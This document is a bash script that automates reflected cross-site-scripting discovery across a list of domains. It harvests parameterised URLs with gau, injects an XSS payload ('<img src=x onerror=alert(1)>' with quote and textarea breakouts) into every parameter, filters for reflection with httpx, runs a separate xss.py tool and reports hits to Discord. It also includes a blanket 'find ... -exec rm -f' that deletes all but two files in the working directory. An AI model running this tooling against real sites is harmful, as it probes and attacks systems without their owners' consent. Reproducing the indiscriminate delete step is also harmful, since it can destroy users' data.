#!/bin/bash

# Read each domain from the domain.txt file
while IFS= read -r domain; do
    echo -e "\nURL grabbing started using gau for $domain \n"

    # Run the gau command and save the output to a file
    gau "$domain" --subs | grep "=" > "${domain}_gau_equalTo.txt"
    
    # Use sed to modify the URLs and save the result to a new file
    sed -e 's/=\([^&]*\)/=-->'\'';\\"\/><\/textarea><img src=x onerror=alert(1)><XSS>/g' "${domain}_gau_equalTo.txt" > "${domain}_updated_urls.txt"
    
    # Sort and remove duplicates
    sort "${domain}_updated_urls.txt" | uniq > "${domain}_unique_urls.txt"

    # HTTPX
    echo "Running HTTPX matchers to find potential XSS parameter for $domain"
    mkdir -p potentialXSS
    cat "${domain}_unique_urls.txt" | httpx -ms "<XSS>" -o "$PWD/potentialXSS/${domain}_pxss.txt"
    
    # logs entry
    (
		echo "============================================="
		echo "Domain Name                              : ${domain}"

		unique_urls_lines=$(wc -l < "${domain}_unique_urls.txt")
		equalTo_lines=$(wc -l < "${domain}_gau_equalTo.txt")
		pxss_lines=$(wc -l < "$PWD/potentialXSS/${domain}_pxss.txt")

		# Print the results
		printf "%-40s : %d line\n" "URLs has = sign" "$equalTo_lines"
		printf "%-40s : %d line\n" "Unique URLs" "$unique_urls_lines"
		printf "%-40s : %d line\n" "Potential XSS" "$pxss_lines"

		echo "============================================="
	) >> logs.txt

    # Remove temp files
    rm -rf "${domain}_gau_equalTo.txt" "${domain}_updated_urls.txt" "${domain}_unique_urls.txt"
    
    # Python XSS tool
    mkdir -p XSS
    python3 xss.py -l "$PWD/potentialXSS/${domain}_pxss.txt" -o "$PWD/XSS/${domain}_xss.txt" -t 20

    # Remove tmp files
    find . -maxdepth 1 -type f ! -name 'domain.txt' ! -name 'logs.txt' -exec rm -f {} +

    # Notify
    echo -e "XSS found: $(cat $PWD/XSS/${domain}_xss.txt | wc -l) and Potential XSS found: $(cat $PWD/potentialXSS/${domain}_pxss.txt | wc -l) at $domain" | notify -provider discord -id rxss

done < $1
